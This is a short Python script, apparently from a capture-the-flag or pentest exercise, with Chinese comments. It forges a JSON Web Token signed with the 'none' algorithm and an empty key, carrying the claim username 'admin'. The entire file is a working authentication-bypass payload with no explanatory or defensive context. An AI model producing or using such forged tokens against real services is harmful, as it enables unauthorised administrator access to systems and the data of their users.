import jwt
token_dict = {
  "secretid": [],
  "username": "admin",
  "password": "aa",
  "iat": 1652681684
}

headers = {
  "alg": "none",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                       "",  # 进行加密签名的密钥
                       algorithm="none",  # 指明签名算法方式, 默认也是HS256
                       headers=headers
                       )
print(jwt_token)